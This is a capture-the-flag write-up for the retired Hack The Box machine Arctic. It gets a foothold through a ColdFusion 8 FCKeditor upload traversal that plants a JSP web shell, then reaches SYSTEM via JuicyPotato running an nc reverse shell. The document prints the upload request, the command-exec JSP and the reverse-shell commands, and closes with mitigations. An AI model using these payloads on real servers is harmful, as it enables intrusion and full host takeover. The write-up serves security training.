---
machine: Arctic
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, coldfusion, file-upload, seimpersonate, juicypotato]
---

# Arctic — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired, publishable writeup.
> Reference notes for a retired box. No real flags or credentials.

## TL;DR

A **ColdFusion 8** on port 8500 with the FCKeditor connector reachable. The module's upload accepts a `folder` value with traversal, so a JSP lands inside the web root and executes: shell as `tolis`. The box is an unpatched Windows Server 2008 R2 and the token holds `SeImpersonatePrivilege`, so JuicyPotato (or MS10-059 as a fallback) finishes at `SYSTEM`.

## Recon

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
135/tcp   msrpc
8500/tcp  http    ColdFusion 8 (JRun 4)
49154/tcp msrpc
```

Port 8500 takes ~30 s to answer: raise timeouts or scans and uploads will lie to you.

## Enumeration

```text
http://<IP>:8500/CFIDE/administrator/
```

- ColdFusion administrator login page (no useful default credentials).
- `http://<IP>:8500/CFIDE/administrator/enter.cfm` and the rest of the `CFIDE` tree answer.
- The vulnerable module is `FCKeditor`, with `upload.cfm` under `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/`.

The service itself leaks host name and version in the admin HTML, which confirms ColdFusion 8 and tells you the upload fix is not applied.

## Foothold

The FCKeditor connector accepts both a folder and a file name. Traversal in `folder` plus an executable extension writes outside the upload directory:

```http
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=../../../../ HTTP/1.1
Content-Type: multipart/form-data; boundary=...

--...
Content-Disposition: form-data; name="newfile"; filename="shell.jsp"
Content-Type: application/x-java-archive

<%@ page import="java.util.*,java.io.*"%>
<% Process p = Runtime.getRuntime().exec(request.getParameter("c")); ... %>
--...
```

The file lands in `/userfiles/file/../../..` → web root, served as JSP. Trigger a reverse shell in PowerShell, or use the JSP itself to pull the next binary:

```bash
rlwrap nc -lvnp 443
```

```text
C:\ColdFusion8\runtime\bin> whoami
arctic\tolis
```

## Escalation

```text
C:\> whoami /priv

SeImpersonatePrivilege        Impersonate a client after authentication   Enabled
```

With `SeImpersonate` and no patches, token kidnapping is the short path:

```text
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\temp\nc.exe <IP> 4444 -e cmd.exe" -t *
```

`-t *` tries every available CLSID; on 2008 R2 the BITS family and several others work. If token kidnapping fails, **MS10-059** (Chimichurri) is the alternative, since the host is an unupdated 2008 R2.

```text
C:\> whoami
nt authority\system
```

## Evidence (redacted)

```text
C:\Users\tolis\Desktop\user.txt          -> <user_flag>
C:\Users\Administrator\Desktop\root.txt  -> <root_flag>
```

## Lessons

- Legacy upload connectors (FCKeditor, CKFinder) survive in old deployments and honour traversal.
- A long timeout is not a network fault: the server needs time to compile the JSP, so wait before declaring the exploit dead.
- `SeImpersonatePrivilege` on a web service is a direct route to `SYSTEM`; the fix is taking that privilege away from the service account.
- Mitigation: remove `CFIDE`, patch ColdFusion, keep 2008 R2 fully updated (or migrate off), and audit which service accounts accumulate impersonation rights.
